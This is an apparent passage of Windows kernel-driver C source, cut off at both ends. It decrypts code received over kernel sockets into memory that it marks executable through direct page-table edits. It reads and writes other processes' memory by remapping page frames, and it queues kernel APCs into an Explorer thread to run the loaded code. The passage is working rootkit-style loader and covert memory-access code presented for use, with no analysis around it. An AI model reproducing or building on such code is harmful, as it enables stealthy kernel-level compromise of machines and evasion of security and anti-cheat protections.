				pNext = pNext->Blink;
			} while (pNext != &pSocket->DpcMemory);
			if (Ptr == 0)
			{
				PHYSICAL_ADDRESS Low = { 0 };
				PHYSICAL_ADDRESS High = { MAXULONG64 };
				do {

					Ptr = fNtos->MmAllocateContiguousMemorySpecifyCache(pCodeCall->nPageSize, Low, High, Low, MmNonCached);

				} while (Ptr == 0);
				//MemoryFlags.MemoryExePtr = 0;
			}


		}
	}
	else
	{

		if (pSocket->ApcMemory.Blink == &pSocket->ApcMemory) {
			do {
				Ptr = fNtos->MmAllocateNonCachedMemory(pCodeCall->nPageSize);
			} while (Ptr == 0);
		}
		else
		{
			LIST_ENTRY* pNext = pSocket->ApcMemory.Blink;
			do
			{
				Memory_Exe_Info* pMemory = (Memory_Exe_Info*)pNext;
				if (pMemory->nPageSize >= pCodeCall->nPageSize){
					Ptr = pMemory->Ptr;
					MemoryFlags.MemoryExePtr = pMemory;
					//RemoveEntryList(pNext);
					ChangeEntryList(pGData, s, pNext, pNext, 0);
					break;
				}
				pNext = pNext->Blink;
			} while (pNext != &pSocket->ApcMemory);

			if (Ptr == 0)
			{
				do {
					Ptr = fNtos->MmAllocateNonCachedMemory(pCodeCall->nPageSize);
				} while (Ptr == 0);
			}
		}
	}
	//do {
	//	Ptr = fNtos->ExAllocatePoolWithTag(NonPagedPool, (pCodeCall->nPageSize + 1) * 0x1000, 'Tag');  //fNtos->MmAllocateNonCachedMemory(pCodeCall->nPageSize);
	//} while (Ptr == 0);

	////ExAllocatePoolWithTag

	//if (((ULONGLONG)Ptr & 0xFFF) != 0){
	//	MemoryFlags.ExePtr = (PVOID)(((ULONGLONG)Ptr & 0xFFFFFFFFFFFFF000) + 0x1000);
	//}
	//else {
	//	MemoryFlags.ExePtr = Ptr;
	//}


	MemoryFlags.ExePtr = Ptr;
	MemoryFlags.Ptr = Ptr;

	fNtos->CopyMemory(MemoryFlags.ExePtr, pCodeCall->Ptr, pCodeCall->MaxSize);
	pGData->_hEncrypt_DEC_V.SelfTradition(pGData, pCodeCall->Sgin, MemoryFlags.ExePtr, pCodeCall->MaxSize);
	MMPTE* pMmpte = 0;
	for (size_t iP = 0; iP < pCodeCall->nPageSize / 0x1000; iP++)
	{
		GetAddressPfn(((DWORD64)MemoryFlags.ExePtr + iP * 0x1000), pGData->PTE_BASE, pMmpte);
		if (pMmpte != 0) {
			MMPTE NewPte; NewPte.u.Long = 0x0A0000000000013B;
			NewPte.u.Hard.PageFrameNumber = pMmpte->u.Hard.PageFrameNumber;
			*pMmpte = NewPte;
			__invlpg(pMmpte);
			if (iP == 0)
			{
				MemoryFlags.pMpte = pMmpte;
			}
		}
	}
	return MemoryFlags;
}


BOOLEAN ExFreeFunctionMemory(PVOID _pGData, SOCKET s, MEMORY_FLAGS* Flags) {

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	SOCKET_INFO* sInfo = &pGData->wsk._SocketArry[s];

	MMPTE NewPte; NewPte.u.Long = 0x0A00000000000139;
	NewPte.u.Hard.PageFrameNumber = Flags->pMpte->u.Hard.PageFrameNumber;
	NewPte.u.Hard.NoExecute = 1;
	NewPte.u.Hard.Write = 1;
	

	if (Flags->Size <= 0x1000)
	{
		*(Flags->pMpte) = NewPte;
		__invlpg(Flags->pMpte);

	}
	else
	{
		MMPTE* pMmpte = 0;
		for (size_t iP = 0; iP < Flags->Size / 0x1000; iP++)
		{
			GetAddressPfn(((DWORD64)Flags->Ptr + iP * 0x1000), pGData->PTE_BASE, pMmpte);
			if (pMmpte != 0)
			{
				NewPte.u.Hard.PageFrameNumber = pMmpte->u.Hard.PageFrameNumber;
				*pMmpte = NewPte;
				__invlpg(pMmpte);
			}

		}
	}
	fNtos->memset(Flags->Ptr, 0, Flags->Size);

	//KeInitializeSpinLock(&pSInfo->MemoryLock);

	if (Flags->Flags == 2){
		if (Flags->MemoryExePtr == 0){
			Memory_Exe_Info * MemoryExePtr = (Memory_Exe_Info *)fNtos->ExAllocatePoolWithTag(NonPagedPool, sizeof(Memory_Exe_Info), 'Tag');
			MemoryExePtr->Ptr = Flags->Ptr;
			MemoryExePtr->nPageSize = (DWORD)Flags->Size;
			MemoryExePtr->Flags = Flags->Flags;
			Flags->MemoryExePtr = MemoryExePtr;
		}

		ChangeEntryList(_pGData, s, (&sInfo->DpcMemory), (&Flags->MemoryExePtr->Link), 1);

		//InsertHeadListV((&sInfo->DpcMemory), (&Flags->MemoryExePtr->Link));
	}
	else
	{
		if (Flags->MemoryExePtr == 0) {
			Memory_Exe_Info* MemoryExePtr = (Memory_Exe_Info*)fNtos->ExAllocatePoolWithTag(NonPagedPool, sizeof(Memory_Exe_Info), 'Tag');
			MemoryExePtr->Ptr = Flags->Ptr;
			MemoryExePtr->nPageSize = (DWORD)Flags->Size;
			MemoryExePtr->Flags = Flags->Flags;
			Flags->MemoryExePtr = MemoryExePtr;
		}
		ChangeEntryList(_pGData, s, (&sInfo->ApcMemory), (&Flags->MemoryExePtr->Link), 1);
		//InsertHeadListV((&sInfo->ApcMemory), (&Flags->MemoryExePtr->Link));
	}
	return TRUE;
}


FORCEINLINE
SOCKET_INFO_BUFFER_LIST * ExAllocateFunctionMemoryData(PVOID _pGData, SOCKET s) {

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;

	WSK_SERVER_INFO * pWsk = &pGData->wsk;
	LIST_ENTRY* pNext = pWsk->SendRecvBuff.Link.Blink;

	if (pNext != &pWsk->SendRecvBuff.Link){
		SOCKET_INFO_BUFFER_LIST* pMemoryList = (SOCKET_INFO_BUFFER_LIST*)pNext;
		ChangeEntryListData(pGData, s, pNext, pNext, 0);
		return pMemoryList;
	}
	return 0;
}

FORCEINLINE
BOOLEAN ExFreeFunctionMemoryData(PVOID _pGData, SOCKET s, SOCKET_INFO_BUFFER_LIST* New) {
	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	WSK_SERVER_INFO* pWsk = &pGData->wsk;
	return ChangeEntryListData(pGData, s, &pWsk->SendRecvBuff.Link, &New->Link, 1);
}





PVOID ExAllocateFunctionMemoryApc(PVOID _pGData, CODE_CALL* pCodeCall) {
	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;

	SELF_STRING_ARRY* AArry = &pGData->SelfAArry;

	if (KeGetCurrentIrql() >= 2) {
		LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD_ExAllocate.Ptr, __LINE__, _pGData, 0, 0);
	}

	PVOID Ptr = 0;
	do {
		Ptr = fNtos->MmAllocateNonCachedMemory(pCodeCall->nPageSize);
	} while (Ptr == 0);
	fNtos->CopyMemory(Ptr, pCodeCall->Ptr, pCodeCall->MaxSize);
	pGData->_hEncrypt_DEC_V.SelfTradition(pGData, pCodeCall->Sgin, Ptr, pCodeCall->MaxSize);
	MMPTE* pMmpte = 0;
	GetAddressPfn((DWORD64)Ptr, pGData->PTE_BASE, pMmpte);
	if (pMmpte != 0) {
		MMPTE NewPte; NewPte.u.Long = 0x0A00000000000139;
		NewPte.u.Hard.PageFrameNumber = pMmpte->u.Hard.PageFrameNumber;
		*pMmpte = NewPte;
		__invlpg(pMmpte);
	}
	return Ptr;
}


//PVOID ExFreeDriverMemory(PVOID _pGData, PVOID BaseAddress) {
//
//	MmFreeContiguousMemory(BaseAddress);
//
//}









PHYSICAL_ADDRESS  MmGetPhysicalAddressSelf(PVOID _pGData, SOCKET s, PEPROCESS Process, PVOID VirtualMem, DWORD* pError) {

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	DWORD64 DirectoryTable = *(DWORD64*)((ULONGLONG)Process + 0x28);


	//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
	//	__LINE__, DirectoryTable, DirectoryTable >> 12);

	ULONGLONG BaseNumber = (DirectoryTable >> 12) & 0xFFFFFFFFFFFF;

	ADDRESS_PTE VirAddress = *((ADDRESS_PTE*)&VirtualMem);

	ULONGLONG PageOffet[4];
	PageOffet[0] = VirAddress.u.PXE_PageNumber;
	PageOffet[1] = VirAddress.u.PPE_PageNumber;
	PageOffet[2] = VirAddress.u.PDE_PageNumber;
	PageOffet[3] = VirAddress.u.PTE_PageNumber;


	//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
	//	__LINE__, VirtualMem, PageOffet[iPLM]);


	SOCKET_INFO* pSocketInfo = &pGData->wsk._SocketArry[s];

	char* Adr = pSocketInfo->OnePage_Phy;

	if (Adr == 0){
		do{
			Adr = (char*)fNtos->MmAllocateNonCachedMemory(PAGE_SIZE);
			pSocketInfo->OnePage_Phy = Adr;
			//Adr = fNtos->ExAllocatePoolWithTag(NonPagedPool, PAGE_SIZE, 'Tag');

		} while (Adr == 0);
	}

	*pError = 0;
	PHYSICAL_ADDRESS rPhy; 
	rPhy.QuadPart = 0;
	MMPTE* pMmpte = 0;
	GetAddressPfn((DWORD64)Adr, pGData->PTE_BASE, pMmpte);

	if (pMmpte == 0){
		*pError = 0x101;
		return rPhy;
	}

	//*pError = 0x102;
	//return rPhy;


	//ULONGLONG Cr3 = __readcr3();
	//__writecr3(DirectoryTable);
	//DWORD64 Ipg = 0;

	////KeRaiseIrql()

	//KIRQL irql = KeGetCurrentIrql();
	//__writecr8(0);

	////
	//PETHREAD pThread = PsGetCurrentThread();

	//char * AdrThread = (char *)pThread;

	//*((char*)(AdrThread + 0x232)) = 1;
	//fNtos->CopyMemory(&Ipg, VirtualMem, sizeof(Ipg));
	//*((char*)(AdrThread + 0x232)) = 0;
	//__writecr8(irql);
	//__writecr3(Cr3);

	//ethread
	

	//ExGetPreviousMode()

	//_Kernel_ExGetPreviousMode

	//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
	//	__LINE__, VirtualMem, VirAddress.u.PTE_PageNumber);

	ULONGLONG _O_PageNumber = pMmpte->u.Hard.PageFrameNumber;
	int iPLM = 4;
	ULONGLONG bPageNumber = BaseNumber;
	do
	{
		iPLM--;
		pMmpte->u.Hard.PageFrameNumber = bPageNumber;
		__invlpg(pMmpte);
		MMPTE* bPTE_Ptr = (MMPTE*)Adr;
	    __invlpg(&PageOffet[iPLM]);
		__invlpg(&bPTE_Ptr[PageOffet[iPLM]]);

		MMPTE uPTE = bPTE_Ptr[PageOffet[iPLM]];

		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
		//	iPLM, uPTE.u.Long, PageOffet[iPLM]);

		if (uPTE.u.Hard.Valid == 0){

			*pError = 0x102;
			break;

			//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
			//	__LINE__, uPTE.u.Long, iPLM);

			//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
			//	__LINE__, uPTE.u.Long, iPLM);

			//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr, __LINE__, uPTE.u.Long, iPLM);

			//KIRQL irql = KeGetCurrentIrql();

			//WriteCR8(0);

			//fNtos->MmInSwapVirtualAddresses(Process, VirtualMem);
			//WriteCR8(irql);

			//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr, __LINE__, uPTE.u.Long, iPLM);
			//__invlpg(&bPTE_Ptr[PageOffet[iPLM]]);
			//uPTE = bPTE_Ptr[PageOffet[iPLM]];
			//if (!uPTE.u.Hard.Valid)
			//{
			//	*pError = 0x102;
			//	break;
			//}
			//else
			//{
			//	fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,__LINE__, uPTE.u.Long, iPLM);
			//}

		}
		if (uPTE.u.Hard.LargePage)
		{
			DWORD64 offsetV = 0;
			for (size_t im = iPLM; im > 0; im--) {
				if (im == 0){
					*pError = 0x103 + (iPLM << 16);
					break;
				}
				offsetV = (offsetV + PageOffet[im]) << 9;
			}

			rPhy.QuadPart = (uPTE.u.Hard.PageFrameNumber << 12) + (offsetV << 12) + VirAddress.u.offset;

			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr,__LINE__, rPhy.QuadPart, VirAddress.u.PTE_PageNumber);

			break;
		}
		if (iPLM == 0){

			rPhy.QuadPart = (uPTE.u.Hard.PageFrameNumber << 12) + VirAddress.u.offset;

			//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
			//	__LINE__, rPhy.QuadPart, VirAddress.u.PTE_PageNumber);

			break;
		}
		bPageNumber = uPTE.u.Hard.PageFrameNumber;
	} while (iPLM > 0);

	pMmpte->u.Hard.PageFrameNumber = _O_PageNumber;
	__invlpg(pMmpte);
	//fNtos->MmFreeNonCachedMemory(Adr, PAGE_SIZE);
	//fNtos->ExFreePoolWithTag(Adr, 'Tag');
	return rPhy;
}


__forceinline void FlushCurrentTbImmediately() {


	unsigned __int64 v0; // rcx
	__int64 result; // rax
	v0 = __readcr4();
	if ((v0 & 0x20080) != 0){
		result = v0 ^ 0x80;
		__writecr4(v0 ^ 0x80);
		__writecr4(v0);
	}
	else
	{
		result = __readcr3();
		__writecr3(result);
	}
}




__forceinline MmCopyMemoryPage(PVOID _pGData, SOCKET s, PEPROCESS Process, PVOID  _Dst, PVOID VirtualMem, SIZE_T _nSize, int Flags) {

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	ULONGLONG BasePtr = ((ULONGLONG)VirtualMem & 0xFFFFFFFFFFFFF000);
	ULONG Offset = (ULONGLONG)VirtualMem & 0xFFF;
	SIZE_T nPageSzie = (Offset + _nSize) / PAGE_SIZE;
	if ((Offset + _nSize) % PAGE_SIZE)
		nPageSzie++;

	SOCKET_INFO* pSocketInfo = &pGData->wsk._SocketArry[s];

	typedef struct _MMPTE_READ_INFO {
		MMPTE* PTE;
		ULONGLONG _O_PageNumer;
	}MMPTE_READ_INFO;

	if (nPageSzie > 2) {
		nPageSzie = 2;
	}

	// 只允许拷贝一个PAGE




	if (nPageSzie != 0)
	{
		char* Adr = pSocketInfo->TwoPage_Read;

		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
		//	__LINE__, nPageSzie, 0);

		if (Adr == 0) {
			do
			{
				Adr = (char*)fNtos->MmAllocateNonCachedMemory(2 * PAGE_SIZE);
				pSocketInfo->TwoPage_Read = Adr;
				//Adr = (char*)fNtos->ExAllocatePoolWithTag(NonPagedPool, nPageSzie * PAGE_SIZE, 'Tag');
			} while (Adr == 0);
		}


		MMPTE_READ_INFO* uRead = 0;

		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
		//	__LINE__, nPageSzie, 0);

		do
		{
			uRead = fNtos->ExAllocatePoolWithTag(NonPagedPool, nPageSzie * sizeof(MMPTE_READ_INFO), 'Tag');

		} while (uRead == 0);
		//fNtos->memset(uRead, 0, sizeof(uRead));

		DWORD uIndex = 0;


		//MEMORY_FLAGS MFlags;
		//_FUNCTION_ENTRY(SendRecvFromEx, MFlags, MEMORY_FLAGS);
		//pS_INFO->Status = ((_SendRecvFromEx)MFlags.Ptr)(pGData, s, WskBuffer, 1);
		//FREE_FUNCTION_ENTRY(SendRecvFromEx, MFlags);



		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
		//	__LINE__, nPageSzie, 0);


		for (size_t iPage = 0; iPage < nPageSzie; iPage++) {

			MMPTE* pMmpte = 0;
			char* bBegin = Adr + (PAGE_SIZE * iPage);
			GetAddressPfn((DWORD64)bBegin, pGData->PTE_BASE, pMmpte);
			if (pMmpte == 0) {

				break;
			}
			uRead[iPage]._O_PageNumer = pMmpte->u.Hard.PageFrameNumber;
			uRead[iPage].PTE = pMmpte;


			DWORD phyError = 0;

			PHYSICAL_ADDRESS phyAddress = pSocketInfo->uMmGetPhysicalAddressSelf(pGData, s, Process, (PVOID)(BasePtr + iPage * 0x1000), &phyError);
			ULONGLONG PageNumber = phyAddress.QuadPart >> 12;

			//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
			//	__LINE__, phyAddress.QuadPart, PageNumber);


			if (phyAddress.QuadPart == 0) {

				break;

			}

			pMmpte->u.Hard.PageFrameNumber = PageNumber;
			__invlpg(pMmpte);
			//__invlpg(bBegin);
			//FlushCurrentTbImmediately();
			uIndex++;

		}

		//FREE_FUNCTION_ENTRY(MmGetPhysicalAddressSelf, MFlags)

		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
		//	__LINE__, uIndex, _nSize);



		if (uIndex == nPageSzie) {

			//__invlpg(pMmpte);

			if (Flags) {

				//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
				//	__LINE__, nPageSzie, _nSize);

				fNtos->CopyMemory(Adr + Offset, _Dst, _nSize);
			}
			else {

				SIZE_T i = 0;
				do
				{
					__invlpg(Adr + Offset + i * 64);
					if (i * 64 > _nSize) {
						break;
					}
					i++;
				} while (1);

				fNtos->CopyMemory(_Dst, Adr + Offset, _nSize);
			}
		}

		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
		//	__LINE__, nPageSzie, _nSize);

		for (DWORD i = 0; i < uIndex; i++)
		{
			MMPTE* pMmpte = uRead[i].PTE;
			pMmpte->u.Hard.PageFrameNumber = uRead[i]._O_PageNumer;
			__invlpg(pMmpte);
		}
		fNtos->ExFreePoolWithTag(uRead, 'Tag');
		//fNtos->MmFreeNonCachedMemory(Adr, nPageSzie * PAGE_SIZE);
		//fNtos->ExFreePoolWithTag(Adr, 'Tag');
		if (uIndex == nPageSzie)
			return 1;
	}
	return 0;





}











DWORD64  MmCopyMemoryV(PVOID _pGData, SOCKET s , PEPROCESS Process, PVOID  _Dst, PVOID VirtualMem, SIZE_T _nSize, int Flags) {

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	ULONGLONG BasePtr = ((ULONGLONG)VirtualMem & 0xFFFFFFFFFFFFF000);
	ULONG Offset = (ULONGLONG)VirtualMem & 0xFFF;
	SIZE_T nPageSzie = (Offset + _nSize) / PAGE_SIZE;
	if ((Offset + _nSize) % PAGE_SIZE)
		nPageSzie++;


	DWORD64 Error = 0;
//	return Error;

	SOCKET_INFO* pSocketInfo = &pGData->wsk._SocketArry[s];


	typedef struct _MMPTE_READ_INFO {
		MMPTE* PTE;
		ULONGLONG _O_PageNumer;
	}MMPTE_READ_INFO;

	if (nPageSzie > 2){
		nPageSzie = 2;
	}

	// 只允许拷贝一个PAGE




	if (nPageSzie != 0)
	{
		char* Adr = pSocketInfo->TwoPage_Read;

		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
		//	__LINE__, nPageSzie, 0);

		if (Adr == 0){
			do{
				Adr = (char*)fNtos->MmAllocateNonCachedMemory(2 * PAGE_SIZE);
				pSocketInfo->TwoPage_Read = Adr;
				//Adr = (char*)fNtos->ExAllocatePoolWithTag(NonPagedPool, nPageSzie * PAGE_SIZE, 'Tag');
			} while (Adr == 0);
		}


		MMPTE_READ_INFO* uRead = 0;

		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
		//	__LINE__, nPageSzie, 0);

		do{
			uRead = fNtos->ExAllocatePoolWithTag(NonPagedPool, nPageSzie * sizeof(MMPTE_READ_INFO), 'Tag');
		} while (uRead == 0);
		//fNtos->memset(uRead, 0, sizeof(uRead));

		DWORD uIndex = 0;


		//MEMORY_FLAGS MFlags;
		//_FUNCTION_ENTRY(SendRecvFromEx, MFlags, MEMORY_FLAGS);
		//pS_INFO->Status = ((_SendRecvFromEx)MFlags.Ptr)(pGData, s, WskBuffer, 1);
		//FREE_FUNCTION_ENTRY(SendRecvFromEx, MFlags);



		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
		//	__LINE__, nPageSzie, 0);


		for (size_t iPage = 0; iPage < nPageSzie; iPage++) {

			MMPTE* pMmpte = 0;
			char* bBegin = Adr + (PAGE_SIZE * iPage);
			GetAddressPfn((DWORD64)bBegin, pGData->PTE_BASE, pMmpte);
			if (pMmpte == 0) {
				Error = 0x11;
				break;
			}
			uRead[iPage]._O_PageNumer = pMmpte->u.Hard.PageFrameNumber;
			uRead[iPage].PTE = pMmpte;

			DWORD phyError = 0;

			PHYSICAL_ADDRESS phyAddress = pSocketInfo->uMmGetPhysicalAddressSelf(pGData, s, Process, (PVOID)(BasePtr + iPage * 0x1000), &phyError);
			ULONGLONG PageNumber = phyAddress.QuadPart >> 12;

			//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
			//	__LINE__, phyAddress.QuadPart, PageNumber);


			if (phyAddress.QuadPart == 0){

				Error = phyError;
				//KAPC_STATE Apc_State;
				//fNtos->KeStackAttachProcess(Process, &Apc_State);
				//phyAddress = fNtos->MmGetPhysicalAddress((PVOID)(BasePtr + iPage * 0x1000));
				//fNtos->KeUnstackDetachProcess(&Apc_State);

				//if (phyAddress.QuadPart == 0){
				//	break;
				//}
				break;

			}

			pMmpte->u.Hard.PageFrameNumber = PageNumber;
			__invlpg(pMmpte);
			//__invlpg(bBegin);
			//FlushCurrentTbImmediately();
			uIndex++;

		}

		//FREE_FUNCTION_ENTRY(MmGetPhysicalAddressSelf, MFlags)
		
		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
		//	__LINE__, uIndex, _nSize);



		if (uIndex == nPageSzie){

			//__invlpg(pMmpte);

			if (Flags) {
				
				//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
				//	__LINE__, nPageSzie, _nSize);
				
				fNtos->CopyMemory(Adr + Offset, _Dst, _nSize);
			}
			else {

				SIZE_T i = 0;
				do
				{
					__invlpg(Adr + Offset + i * 64);
					if (i * 64 > _nSize){
						Error = 0x13;
						break;
					}
					i++;
				} while (1);
				fNtos->CopyMemory(_Dst, Adr + Offset, _nSize);
			}
		}

		//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
		//	__LINE__, nPageSzie, _nSize);

		for (DWORD i = 0; i < uIndex; i++){
			MMPTE* pMmpte = uRead[i].PTE;
			pMmpte->u.Hard.PageFrameNumber = uRead[i]._O_PageNumer;
			__invlpg(pMmpte);
		}
		fNtos->ExFreePoolWithTag(uRead, 'Tag');
		//fNtos->MmFreeNonCachedMemory(Adr, nPageSzie * PAGE_SIZE);
		//fNtos->ExFreePoolWithTag(Adr, 'Tag');
		if (uIndex == nPageSzie) 
			return 0;
	}
	return Error;//0x102;//Error;
}


inline HANDLE GetPrccessFirstThreadID(PVOID _pGData, PEPROCESS eprocess) {

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;

	LIST_ENTRY* _begin = (LIST_ENTRY*)((ULONGLONG)eprocess + pGData->offsetEprocess_ThreadList); // 0x30
	LIST_ENTRY* _Entry = _begin->Flink;
	PETHREAD Ethread = (PETHREAD)((ULONGLONG)_Entry - pGData->offsetEthread_ThreadList);

	return fNtos->PsGetThreadId(Ethread);
}

__forceinline PETHREAD GetPrccessFirstThread(PVOID _pGData, PEPROCESS eprocess) {

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;

	LIST_ENTRY* _begin = (LIST_ENTRY*)((ULONGLONG)eprocess + pGData->offsetEprocess_ThreadList); // 0x30
	LIST_ENTRY* _Entry = _begin->Flink;
	PETHREAD Ethread = (PETHREAD)((ULONGLONG)_Entry - pGData->offsetEthread_ThreadList);
	return Ethread;
}

inline int EnumProcessThread(PVOID _pGData, PEPROCESS eprocess, PETHREAD* ethreadArry) {
	LIST_ENTRY* _begin = (LIST_ENTRY*)((ULONGLONG)eprocess + 0x30);
	LIST_ENTRY* _Entry = _begin->Flink;
	int Size = 0;
	while (_Entry != _begin) {
		PETHREAD ethread = (PETHREAD)((ULONGLONG)_Entry - 0x2F8);
		ethreadArry[Size] = ethread;
		Size++;
		if (Size > 256) {
			break;
		}
		_Entry = _Entry->Flink;
	}
	return Size;
}

DWORD64 RunApcRunCode(PVOID _pGData, SOCKET s, DWORD RunCode) {

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	//KIRQL irql = KeGetCurrentIrql();
	//fNtos->KeLowerIrql(APC_LEVEL);
	DWORD Flags = 0;
	if (RunCode > 0x80000000)
		Flags = 1;


	DWORD64 Ret = 0;
	_FUNCTION_IMP(Get_Win32k_Process_Explorer, Ret, pGData, Flags);

	SOCKET_INFO* sInfo = &pGData->wsk._SocketArry[s];
	PKSOCKET NowSocket = &pGData->wsk.bWsk.kSocket[s];

	RUN_APC_ARG* Arg = &sInfo->_RunApcArg[Flags];

	Arg->RunCode = RunCode;
	Arg->s = s;
	Arg->_pGData = _pGData;
	fNtos->KeInitializeEvent(&NowSocket->AsyncContext.CompletionEvent, SynchronizationEvent, FALSE);
	pGData->wsk._SocketArry[s].List.Type = 4;
	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, 0, s);
	//PEPROCESS eprocess;


	_GetProcessEprocess uGetProcessEprocess = 0;

	MEMORY_FLAGS MFlags;
	_FUNCTION_ENTRY(GetProcessEprocess, MFlags, _GetProcessEprocess);
	PEPROCESS eprocess = uGetProcessEprocess(pGData, (HANDLE)Ret);



	FREE_FUNCTION_ENTRY(GetProcessEprocess, MFlags);

	if (fNtos->MmIsAddressValid(eprocess))
	{

		LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, 0, s);
		PETHREAD Ethread = GetPrccessFirstThread(_pGData, eprocess);

		if (fNtos->MmIsAddressValid(Ethread))
		{
			if (Flags) {

				_FUNCTION_ENTRY_NEW(RunApcSocketBuffer, Arg->_Run_Routine, PKKERNEL_ROUTINE);

				//CHANGE_FUNCTION_ENTRY(RunApcSocketBuffer, Arg->_Run_Routine, PKKERNEL_ROUTINE);
			}
			else {
				_FUNCTION_ENTRY_NEW(RunApc, Arg->_Run_Routine, PKKERNEL_ROUTINE);
				//CHANGE_FUNCTION_ENTRY(RunApc, Arg->_Run_Routine, PKKERNEL_ROUTINE);
			}

			fNtos->KeInitializeEvent(&Arg->Event, SynchronizationEvent, FALSE);

			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, Arg->_Run_Routine, Flags, Arg->RunCode);

			fNtos->KeInitializeApc(&Arg->Apc, Ethread, 0, (PKKERNEL_ROUTINE)Arg->_Run_Routine.Ptr, 0, (PKNORMAL_ROUTINE)pGData->RunApcNo.SelfTradition, KernelMode, Arg);

			pGData->wsk._SocketArry[s].Status = fNtos->KeInsertQueueApc(&Arg->Apc, Arg, Arg, 0);

			Ret = pGData->wsk._SocketArry[s].Status;

			//fNtos->ObfDereferenceObject(Ethread);
		}

	}


	//if (NT_SUCCESS(fNtos->PsLookupProcessByProcessId((HANDLE)Ret, &eprocess))) {
	//	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, 0, s);
	//	HANDLE  tid = GetPrccessFirstThreadID(_pGData, eprocess);
	//	fNtos->ObfDereferenceObject(eprocess);
	//	PETHREAD Ethread = 0;
